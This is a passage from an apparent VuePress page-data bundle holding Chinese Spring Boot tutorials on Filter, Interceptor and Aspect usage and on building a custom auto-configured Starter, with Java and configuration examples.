进行处理，判断当前请求是否进行了重定向\n        5.4.5 通过返回的 modelandview 查找并设置视图\n        5.4.6 执行拦截器后置方法\n        5.4.7 视图渲染\n        5.4.8 再调用拦截的执行完成方法\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n',charsets:{cjk:!0}},{title:"SpringBoot 之 Filter、Interceptor、Aspect",frontmatter:{title:"SpringBoot 之 Filter、Interceptor、Aspect",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/200/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/200.SpringBoot%20%E4%B9%8B%20Filter%E3%80%81Interceptor%E3%80%81Aspect.html",relativePath:"00.java/20.Spring/23.springboot/200.SpringBoot 之 Filter、Interceptor、Aspect.md",key:"v-b3b797ce",path:"/spring/spring-boot/200/",headers:[{level:2,title:"Filter 过滤器",slug:"filter-过滤器",normalizedTitle:"filter 过滤器",charIndex:140},{level:3,title:"第一种",slug:"第一种",normalizedTitle:"第一种",charIndex:192},{level:3,title:"第二种",slug:"第二种",normalizedTitle:"第二种",charIndex:971},{level:2,title:"Interceptor 拦截器",slug:"interceptor-拦截器",normalizedTitle:"interceptor 拦截器",charIndex:1678},{level:3,title:"一、实现HandlerInterceptor接口",slug:"一、实现handlerinterceptor接口",normalizedTitle:"一、实现 handlerinterceptor 接口",charIndex:1798},{level:3,title:"二、注册到InterceptorRegistration",slug:"二、注册到interceptorregistration",normalizedTitle:"二、注册到 interceptorregistration",charIndex:3314},{level:2,title:"Aspect 切面",slug:"aspect-切面",normalizedTitle:"aspect 切面",charIndex:4229}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"Filter 过滤器 第一种 第二种 Interceptor 拦截器 一、实现HandlerInterceptor接口 二、注册到InterceptorRegistration Aspect 切面",content:'springboot 提供了集中拦截机制，可以方便我们在业务层进行扩展，熟悉的有 filter、interceptor、Aspect。像 ControllerAdvice 仅用于处理 controller 异常事比较多的，所以再次不过多介绍。下图介绍了机制所在层次：\n\n\n\n\n# Filter 过滤器\n\n实现方式有两种，过滤器无法获得上下文、值栈里的对象，并对所有请求起作用\n\n\n# 第一种\n\n实现 Filter 接口\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\nimport javax.servlet.*;\nimport java.io.IOException;\n\n@Component\n@Slf4j\npublic class MyFilter implements Filter {\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        log.info("初始化");\n    }\n\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        log.info("执行");\n        filterChain.doFilter(servletRequest,servletResponse);\n    }\n\n    @Override\n    public void destroy() {\n        log.info("销毁");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 第二种\n\n配置到 Bean\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.MyFilter;\nimport org.springframework.boot.web.servlet.FilterRegistrationBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport java.util.Arrays;\n\n@Configuration\npublic class FilterConfig {\n\n    @Bean\n    public FilterRegistrationBean myFilter(){\n        FilterRegistrationBean filterRegistrationBean = new FilterRegistrationBean();\n        filterRegistrationBean.setFilter(new MyFilter());\n        filterRegistrationBean.setUrlPatterns(Arrays.asList("/*"));\n        return filterRegistrationBean;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# Interceptor 拦截器\n\n拦截器可以获取 IOC 容器中的各个 bean, 拦截器是基于 java 的反射机制的，拦截器只能对 action 请求起作用，拦截器可以访问 action 上下文、值栈里的对象，但无法获取参数。\n\n\n# 一、实现 HandlerInterceptor 接口\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.servlet.HandlerInterceptor;\nimport org.springframework.web.servlet.ModelAndView;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@Slf4j\n@Component\npublic class MyInterceptor implements HandlerInterceptor{\n\n    /**\n     * 功能描述: 执行方法前\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        log.info("执行方法前");\n        return false;\n    }\n\n    /**\n     * 功能描述: 执行方法后，有异常不执行\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @Override\n    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {\n        log.info("执行方法后，有异常不执行");\n    }\n\n    /**\n     * 功能描述: 执行完一定会执行\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @Override\n    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n        log.info("执行完一定会执行");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# 二、注册到 InterceptorRegistration\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.MyInterceptor;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistration;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\n\n@Configuration\npublic class InterceptorConfig implements WebMvcConfigurer{\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        //註冊TestInterceptor拦截器 new 或者 注入 都行\n        InterceptorRegistration registration = registry.addInterceptor(new MyInterceptor());\n        //所有路径都被拦截\n        registration.addPathPatterns("/**");\n        //添加不拦截路径\n        registration.excludePathPatterns("/","/error","/static/**");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# Aspect 切面\n\nAspect 可以自定义要切入的类甚至再细的方法，粒度最小。\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.aspectj.lang.JoinPoint;\nimport org.aspectj.lang.ProceedingJoinPoint;\nimport org.aspectj.lang.annotation.*;\nimport org.springframework.stereotype.Component;\n\n@Aspect\n@Component\n@Slf4j\npublic class MyAspect {\n\n//    @Before("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n//    public void Before(JoinPoint point){\n//        log.info("执行前");\n//    }\n//    @After("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n//    public void After(JoinPoint point){\n//        log.info("执行后");\n//    }\n//    @AfterThrowing("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n//    public void AfterThrowing(JoinPoint point){\n//        log.info("执行异常");\n//    }\n\n    @Around("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n    public Object Around(ProceedingJoinPoint point) throws Throwable {\n        log.info("MyAspect 环绕执行");\n        log.info("MyAspect 参数 ",point.getArgs());\n        Object obj = point.proceed();\n        log.info("MyAspect 执行完成结果 ",obj);\n        return obj;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n',normalizedContent:'springboot 提供了集中拦截机制，可以方便我们在业务层进行扩展，熟悉的有 filter、interceptor、aspect。像 controlleradvice 仅用于处理 controller 异常事比较多的，所以再次不过多介绍。下图介绍了机制所在层次：\n\n\n\n\n# filter 过滤器\n\n实现方式有两种，过滤器无法获得上下文、值栈里的对象，并对所有请求起作用\n\n\n# 第一种\n\n实现 filter 接口\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.stereotype.component;\n\nimport javax.servlet.*;\nimport java.io.ioexception;\n\n@component\n@slf4j\npublic class myfilter implements filter {\n    @override\n    public void init(filterconfig filterconfig) throws servletexception {\n        log.info("初始化");\n    }\n\n    @override\n    public void dofilter(servletrequest servletrequest, servletresponse servletresponse, filterchain filterchain) throws ioexception, servletexception {\n        log.info("执行");\n        filterchain.dofilter(servletrequest,servletresponse);\n    }\n\n    @override\n    public void destroy() {\n        log.info("销毁");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 第二种\n\n配置到 bean\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.myfilter;\nimport org.springframework.boot.web.servlet.filterregistrationbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport java.util.arrays;\n\n@configuration\npublic class filterconfig {\n\n    @bean\n    public filterregistrationbean myfilter(){\n        filterregistrationbean filterregistrationbean = new filterregistrationbean();\n        filterregistrationbean.setfilter(new myfilter());\n        filterregistrationbean.seturlpatterns(arrays.aslist("/*"));\n        return filterregistrationbean;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# interceptor 拦截器\n\n拦截器可以获取 ioc 容器中的各个 bean, 拦截器是基于 java 的反射机制的，拦截器只能对 action 请求起作用，拦截器可以访问 action 上下文、值栈里的对象，但无法获取参数。\n\n\n# 一、实现 handlerinterceptor 接口\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.stereotype.component;\nimport org.springframework.web.servlet.handlerinterceptor;\nimport org.springframework.web.servlet.modelandview;\n\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\n\n@slf4j\n@component\npublic class myinterceptor implements handlerinterceptor{\n\n    /**\n     * 功能描述: 执行方法前\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @override\n    public boolean prehandle(httpservletrequest request, httpservletresponse response, object handler) throws exception {\n        log.info("执行方法前");\n        return false;\n    }\n\n    /**\n     * 功能描述: 执行方法后，有异常不执行\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @override\n    public void posthandle(httpservletrequest request, httpservletresponse response, object handler, modelandview modelandview) throws exception {\n        log.info("执行方法后，有异常不执行");\n    }\n\n    /**\n     * 功能描述: 执行完一定会执行\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @override\n    public void aftercompletion(httpservletrequest request, httpservletresponse response, object handler, exception ex) throws exception {\n        log.info("执行完一定会执行");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# 二、注册到 interceptorregistration\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.myinterceptor;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.web.servlet.config.annotation.interceptorregistration;\nimport org.springframework.web.servlet.config.annotation.interceptorregistry;\nimport org.springframework.web.servlet.config.annotation.webmvcconfigurer;\n\n\n@configuration\npublic class interceptorconfig implements webmvcconfigurer{\n\n    @override\n    public void addinterceptors(interceptorregistry registry) {\n        //註冊testinterceptor拦截器 new 或者 注入 都行\n        interceptorregistration registration = registry.addinterceptor(new myinterceptor());\n        //所有路径都被拦截\n        registration.addpathpatterns("/**");\n        //添加不拦截路径\n        registration.excludepathpatterns("/","/error","/static/**");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# aspect 切面\n\naspect 可以自定义要切入的类甚至再细的方法，粒度最小。\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.aspectj.lang.joinpoint;\nimport org.aspectj.lang.proceedingjoinpoint;\nimport org.aspectj.lang.annotation.*;\nimport org.springframework.stereotype.component;\n\n@aspect\n@component\n@slf4j\npublic class myaspect {\n\n//    @before("execution(* com.wt.cloud.web.helloweb.*(..))")\n//    public void before(joinpoint point){\n//        log.info("执行前");\n//    }\n//    @after("execution(* com.wt.cloud.web.helloweb.*(..))")\n//    public void after(joinpoint point){\n//        log.info("执行后");\n//    }\n//    @afterthrowing("execution(* com.wt.cloud.web.helloweb.*(..))")\n//    public void afterthrowing(joinpoint point){\n//        log.info("执行异常");\n//    }\n\n    @around("execution(* com.wt.cloud.web.helloweb.*(..))")\n    public object around(proceedingjoinpoint point) throws throwable {\n        log.info("myaspect 环绕执行");\n        log.info("myaspect 参数 ",point.getargs());\n        object obj = point.proceed();\n        log.info("myaspect 执行完成结果 ",obj);\n        return obj;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n',charsets:{cjk:!0}},{title:"SpringBoot 之 Starter",frontmatter:{title:"SpringBoot 之 Starter",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/201/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/201.SpringBoot%20%E4%B9%8B%20Starter.html",relativePath:"00.java/20.Spring/23.springboot/201.SpringBoot 之 Starter.md",key:"v-06ddce46",path:"/spring/spring-boot/201/",headers:[{level:2,title:"一、starter依赖",slug:"一、starter依赖",normalizedTitle:"一、starter 依赖",charIndex:311},{level:2,title:"二、添加配置类",slug:"二、添加配置类",normalizedTitle:"二、添加配置类",charIndex:718},{level:2,title:"添加加载类",slug:"添加加载类",normalizedTitle:"添加加载类",charIndex:1894},{level:2,title:"四、指定加载文件路径",slug:"四、指定加载文件路径",normalizedTitle:"四、指定加载文件路径",charIndex:5706},{level:2,title:"五、介绍下其他条件装配注解",slug:"五、介绍下其他条件装配注解",normalizedTitle:"五、介绍下其他条件装配注解",charIndex:6516},{level:2,title:"六、升级到 SpringBoot3 使用 starter",slug:"六、升级到-springboot3-使用-starter",normalizedTitle:"六、升级到 springboot3 使用 starter",charIndex:7103}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"一、starter依赖 二、添加配置类 添加加载类 四、指定加载文件路径 五、介绍下其他条件装配注解 六、升级到 SpringBoot3 使用 starter",content:'Spring Boot Starter 是一组可重用的依赖库，它们提供了一种快速启动 Spring Boot 应用程序的方式。每个 Starter 都包含了一组预配置的依赖项和自动配置类，使得使用者可以轻松地集成各种不同的功能模块，而无需手动配置大量的依赖项和参数。这样，开发人员可以更加专注于业务逻辑的实现，而不需要关心底层的配置和集成细节。\n\nSpring Boot Starter 的意义在于减少了应用程序的开发成本和复杂度，提高了开发效率和代码质量，并且支持更快的迭代和部署。另外，社区也提供了很多常用的 Starter，如数据库、Web 框架、安全框架等，可以直接使用，也可以通过定制来满足具体的需求。\n\n\n# 一、starter 依赖\n\n新建一个 spring boot 工程。\n\n\x3c!-- 包含了log 以及 autoconfigure 等 --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter</artifactId>\n</dependency>\n\n\x3c!-- 对 @ConfigurationProperties 的处理 --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 二、添加配置类\n\npackage com.xianwt.cloud.properties;\n\nimport lombok.Data;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.stereotype.Component;\n\nimport java.util.List;\n\n/**\n * @Author big uncle\n * @Date 2019/11/27 9:27\n **/\n@ConfigurationProperties(prefix = "security.authentication")\n@Data\npublic class AuthenticationProperties {\n\n    /**\n     * token\n    **/\n    private String userToken = "USER:TOKEN:";\n    /**\n     * 拦截\n    **/\n    private String authorization = "Authorization";\n    /**\n     * 默认参数用户\n     **/\n    private String userKey = "default:user:";\n    /**\n     * 权限\n    **/\n    private String authorityKey = "USER:AUTHORITY:";\n    /**\n     * 用户访问资源锁 默认不拦截\n    **/\n    private Boolean authorityLock = false;\n    /**\n     * 项目过滤集合, 以逗号分割\n    **/\n    private List<String> projectUrl;\n    /**\n     * 特殊路径放弃拦截，走非 RequestData 方式\n     **/\n    private List<String> specialUrl;\n    /**\n     * 失败处理器\n    **/\n    private String failureUrl = "/failure/authenticationFilter";\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# 添加加载类\n\npackage com.xianwt.cloud.properties;\n\n/**\n * @Author big uncle\n * @Date 2020/3/29 10:58\n * @module\n **/\n\nimport com.xianwt.cloud.cep.AuthenticationCep;\nimport com.xianwt.cloud.cep.AuthorizationCep;\nimport com.xianwt.cloud.cep.ProjectUrlFilterCep;\nimport com.xianwt.cloud.cep.SpecialFilterCep;\nimport com.xianwt.cloud.cep.impl.AuthenticationCepImpl;\nimport com.xianwt.cloud.cep.impl.AuthorizationCepImpl;\nimport com.xianwt.cloud.cep.impl.ProjectUrlFilterCepImpl;\nimport com.xianwt.cloud.cep.impl.SpecialFilterCepImpl;\nimport com.xianwt.cloud.filter.AuthenticationFilter;\nimport com.xianwt.cloud.server.AuthenticationServerSource;\nimport com.xianwt.cloud.server.AuthorizationServerSource;\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.autoconfigure.EnableAutoConfiguration;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnBean;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnClass;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;\nimport org.springframework.boot.context.properties.EnableConfigurationProperties;\nimport org.springframework.boot.web.servlet.FilterRegistrationBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport javax.annotation.Resource;\n\n@Configuration\n@EnableConfigurationProperties({AuthenticationProperties.class})\npublic class AuthenticationConfiguration {\n\n    private static final Log log = LogFactory.getLog(AuthenticationFilter.class);\n\n    @Autowired\n    private AuthenticationProperties authenticationProperties;\n\n\n    public ProjectUrlFilterCep projectUrlFilterCep(){\n        return new ProjectUrlFilterCepImpl(authenticationProperties);\n    }\n\n    public SpecialFilterCep specialFilterCep(){\n        return new SpecialFilterCepImpl(authenticationProperties);\n    }\n\n    @Bean\n    public AuthenticationCep authenticationCep(AuthenticationServerSource authenticationServerSource){\n        AuthenticationCepImpl authenticationCep = new AuthenticationCepImpl(authenticationProperties,authenticationServerSource);\n        return authenticationCep;\n    }\n\n    @Bean\n    public AuthorizationCep authorizationCep(AuthorizationServerSource authorizationServerSource){\n        AuthorizationCepImpl authenticationCep = new AuthorizationCepImpl(authenticationProperties,authorizationServerSource);\n        return authenticationCep;\n    }\n\n\n    @Bean\n    public FilterRegistrationBean<AuthenticationFilter> testFilterRegistration(AuthenticationCep authenticationCep,AuthorizationCep authorizationCep) {\n        FilterRegistrationBean<AuthenticationFilter> registration = new FilterRegistrationBean<>();\n        AuthenticationFilter authenticationFilter = AuthenticationFilter.builder()\n                .authenticationProperties(authenticationProperties)\n                .specialFilterCep(specialFilterCep())\n                .projectUrlFilterCep(projectUrlFilterCep())\n                .authenticationCep(authenticationCep)\n                .authorizationCep(authorizationCep)\n                .build();\n        registration.setFilter(authenticationFilter);\n        //配置过滤路径\n        registration.addUrlPatterns("/*");\n        //设置filter名称\n        registration.setName("authenticationFilter");\n        //请求中过滤器执行的先后顺序，值越小越先执行\n        registration.setOrder(1);\n        return registration;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\n最主要得就是注解，至于业务逻辑大家都是写自己得。\n\n\n# 四、指定加载文件路径\n\n在 resources 目录下新建 META-INF 文件夹，在 META-INF 文件夹下在新建 spring.factories 文件，且在文添加以下内容\n\n# Auto Configure\norg.springframework.boot.autoconfigure.EnableAutoConfiguration=com.xianwt.cloud.properties.AuthenticationConfiguration\n\n\n1\n2\n\n\n不出问题大家发布后，在别的项目依赖自己的 jar 就可以了。但除了 EnableAutoConfiguration 外还有其他的一些类可以共我们使用：\n\n * EnableAutoConfiguration：指定自动配置类，启动会执行指定的类。\n * ApplicationContextInitializer：初始化应用程序上下文的回调接口，可以帮助我们拿到 applicationContext。\n * ApplicationListener：监听应用程序事件的回调接口，这里可以监听 ContextRefreshedEvent 当应用程序上下文被初始化或刷新时触发；ApplicationStartedEvent 当 Spring 应用程序上下文准备完毕后，但尚未运行时触发；ApplicationReadyEvent 当应用程序已经启动并准备好服务请求时触发；ContextClosedEvent 当应用程序上下文关闭时触发；也可以触发我们的自定义事件。\n * ConditionContributor：为自动配置提供额外的条件，可以用 @ConditionalOnProperty 来代替。\n * TemplateAvailabilityProvider：在运行时检查可用模板的策略接口，使用它们来确定是否存在正确的模板文件。\n\n\n# 五、介绍下其他条件装配注解\n\n@ConditionalOnBean 在当前上下文中存在某个对象时，才会实例化一个 Bean\n@ConditionalOnMissingBean 在当前上下文中不存在某个对象时，才会实例化一个 Bean\n@Conditiona lOnClass 表示当 class path 有指定的类时，配置生效。\n@ConditionalOnMissingClass 表示当 classpath 中没有指定的类的时候，配置生效。\n@ConditionalOnProperty 注解根据 name 来读取 Spring Boot 的 Environment 的 变量包含的属性，根据其值与 havingValue 的值比较结果决定配置是否生效。如果没有指定 havingValue ，只要属性不为 false ，配置都能生效。matcblfMissing 为例 意味着如果 Environment 没有包含 “message.center.enabled”，配置也能生效，默认为 false。\n@ConditionalOnExpression ，当表达式为 true 时，才会实例化一个 Bean ，支持 SpEL 表达式，比如根据配置文件中的某个值来决定配置是否生效。\n@ConditionalOnJava ，当存在指定的 Java 版本的时候。\n\n\n# 六、升级到 SpringBoot3 使用 starter\n\n在 SpringBoot2.7 就已经说明建议使用 META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports 的方式作为定义自动装配文件位置。而在 3.0 版本，已经是移除了 META-INF/spring.factories，所以我们继续通过 META-INF/spring.factories 文件定义将不在生效。\n\n\x3c!-- 添加依赖 --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-autoconfigure</artifactId>\n</dependency>\n\n\x3c!-- 对 @ConfigurationProperties 的处理 --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n@AutoConfiguration\n@EnableConfigurationProperties(value = TestProperties.class)\npublic class TestAutoConfiguration {\n\n    @Bean\n    public TestTemplate testTemplate(){\n        return new TestTemplate ();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n@AutoConfiguration 是 spring boot2.7 新引入的，自动配置类必须放进下面的文件里才算自动配置类\n\n在 META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports 文件里面添加\n\ncom.spring.demo.test.TestAutoConfiguration\n\n\n1\n',normalizedContent:'spring boot starter 是一组可重用的依赖库，它们提供了一种快速启动 spring boot 应用程序的方式。每个 starter 都包含了一组预配置的依赖项和自动配置类，使得使用者可以轻松地集成各种不同的功能模块，而无需手动配置大量的依赖项和参数。这样，开发人员可以更加专注于业务逻辑的实现，而不需要关心底层的配置和集成细节。\n\nspring boot starter 的意义在于减少了应用程序的开发成本和复杂度，提高了开发效率和代码质量，并且支持更快的迭代和部署。另外，社区也提供了很多常用的 starter，如数据库、web 框架、安全框架等，可以直接使用，也可以通过定制来满足具体的需求。\n\n\n# 一、starter 依赖\n\n新建一个 spring boot 工程。\n\n\x3c!-- 包含了log 以及 autoconfigure 等 --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter</artifactid>\n</dependency>\n\n\x3c!-- 对 @configurationproperties 的处理 --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-configuration-processor</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 二、添加配置类\n\npackage com.xianwt.cloud.properties;\n\nimport lombok.data;\nimport org.springframework.boot.context.properties.configurationproperties;\nimport org.springframework.stereotype.component;\n\nimport java.util.list;\n\n/**\n * @author big uncle\n * @date 2019/11/27 9:27\n **/\n@configurationproperties(prefix = "security.authentication")\n@data\npublic class authenticationproperties {\n\n    /**\n     * token\n    **/\n    private string usertoken = "user:token:";\n    /**\n     * 拦截\n    **/\n    private string authorization = "authorization";\n    /**\n     * 默认参数用户\n     **/\n    private string userkey = "default:user:";\n    /**\n     * 权限\n    **/\n    private string authoritykey = "user:authority:";\n    /**\n     * 用户访问资源锁 默认不拦截\n    **/\n    private boolean authoritylock = false;\n    /**\n     * 项目过滤集合, 以逗号分割\n    **/\n    private list<string> projecturl;\n    /**\n     * 特殊路径放弃拦截，走非 requestdata 方式\n     **/\n    private list<string> specialurl;\n    /**\n     * 失败处理器\n    **/\n    private string failureurl = "/failure/authenticationfilter";\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# 添加加载类\n\npackage com.xianwt.cloud.properties;\n\n/**\n * @author big uncle\n * @date 2020/3/29 10:58\n * @module\n **/\n\nimport com.xianwt.cloud.cep.authenticationcep;\nimport com.xianwt.cloud.cep.authorizationcep;\nimport com.xianwt.cloud.cep.projecturlfiltercep;\nimport com.xianwt.cloud.cep.specialfiltercep;\nimport com.xianwt.cloud.cep.impl.authenticationcepimpl;\nimport com.xianwt.cloud.cep.impl.authorizationcepimpl;\nimport com.xianwt.cloud.cep.impl.projecturlfiltercepimpl;\nimport com.xianwt.cloud.cep.impl.specialfiltercepimpl;\nimport com.xianwt.cloud.filter.authenticationfilter;\nimport com.xianwt.cloud.server.authenticationserversource;\nimport com.xianwt.cloud.server.authorizationserversource;\nimport lombok.extern.slf4j.slf4j;\nimport org.apache.commons.logging.log;\nimport org.apache.commons.logging.logfactory;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.autoconfigure.enableautoconfiguration;\nimport org.springframework.boot.autoconfigure.condition.conditionalonbean;\nimport org.springframework.boot.autoconfigure.condition.conditionalonclass;\nimport org.springframework.boot.autoconfigure.condition.conditionalonproperty;\nimport org.springframework.boot.context.properties.enableconfigurationproperties;\nimport org.springframework.boot.web.servlet.filterregistrationbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport javax.annotation.resource;\n\n@configuration\n@enableconfigurationproperties({authenticationproperties.class})\npublic class authenticationconfiguration {\n\n    private static final log log = logfactory.getlog(authenticationfilter.class);\n\n    @autowired\n    private authenticationproperties authenticationproperties;\n\n\n    public projecturlfiltercep projecturlfiltercep(){\n        return new projecturlfiltercepimpl(authenticationproperties);\n    }\n\n    public specialfiltercep specialfiltercep(){\n        return new specialfiltercepimpl(authenticationproperties);\n    }\n\n    @bean\n    public authenticationcep authenticationcep(authenticationserversource authenticationserversource){\n        authenticationcepimpl authenticationcep = new authenticationcepimpl(authenticationproperties,authenticationserversource);\n        return authenticationcep;\n    }\n\n    @bean\n    public authorizationcep authorizationcep(authorizationserversource authorizationserversource){\n        authorizationcepimpl authenticationcep = new authorizationcepimpl(authenticationproperties,authorizationserversource);\n        return authenticationcep;\n    }\n\n\n    @bean\n    public filterregistrationbean<authenticationfilter> testfilterregistration(authenticationcep authenticationcep,authorizationcep authorizationcep) {\n        filterregistrationbean<authenticationfilter> registration = new filterregistrationbean<>();\n        authenticationfilter authenticationfilter = authenticationfilter.builder()\n                .authenticationproperties(authenticationproperties)\n                .specialfiltercep(specialfiltercep())\n                .projecturlfiltercep(projecturlfiltercep())\n                